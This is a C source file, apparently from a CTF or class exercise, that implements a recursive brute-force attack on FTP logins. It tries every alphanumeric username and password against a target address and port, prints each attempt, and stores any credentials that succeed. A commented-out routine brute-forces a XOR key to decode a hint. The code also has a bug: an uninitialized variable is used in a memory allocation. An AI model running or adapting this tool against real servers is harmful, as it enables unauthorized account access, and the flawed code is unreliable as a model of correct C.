#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "brutexor.h"
#include "exploit.h"

char *expected, *cadeia;
unsigned char *characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

int get_user(char *user, int size, int pos, login l, char *addr, int port) {
	char *passwd;
	int i, j;
	int answer;
	if (pos == 0) {
		for (j = 1; j <= MAX_CHAR; j++) {
			passwd = (char *) malloc(sizeof(char)*i+1);
			memset(passwd, '\0', i+1);
			answer = get_passwd(passwd, user, j, j, l, addr, port);
			free(passwd);
		}
		return answer;
	}
	for (i = 0; i < 62; i++) {
		user[size-pos] = characters[i];
		answer = get_user(user, size,  pos-1, l, addr, port);
		if (answer) return answer;
	}
	return 0;
}

int get_passwd(char *passwd, char *user, int size, int pos, login l, char *addr, int port) {
	int i, ftp_fd;
	int answer;
	if (pos == 0) {
		printf("Trying %s:%s\n", user, passwd);
		ftp_fd = ftp_login(addr, port, user, passwd);
		if (ftp_fd) {
			strcpy(l->user, user);
			strcpy(l->passwd, passwd);
			return ftp_fd;
		}
		return 0;
	}
	for (i = 0; i < 62; i++) {
		passwd[size-pos] = characters[i];
		answer = get_passwd(passwd, user, size, pos-1, l, addr, port);
		if (answer) return answer;
	}
	return 0;
}

/*int brutexor() {

	char *key, *aux;
	char *word;
	int keysize, j, k, i = 0;

	for (j = 1; j <=8; j++) {
		word = (char *) malloc(sizeof(char)*i+1);
		key = get_string(word, j, j);
		if (key != NULL) {
			break;
		}
		free(word);
	}
	if (key) {
		printf("Chave = %s\n", key);
	} else {
		printf("Nao encontrado\n");
		return -1;
	}

	while (key[i] != '\0') {
		i++;
	}

	keysize = i;

	char dica[20];
	for (k = 0; k < strlen(cadeia); k++) {
		dica[k] = cadeia[k] ^ key[k % keysize];
	}

	printf("Dica = %s\n", dica);

	free(key);
	return 0;
}*/
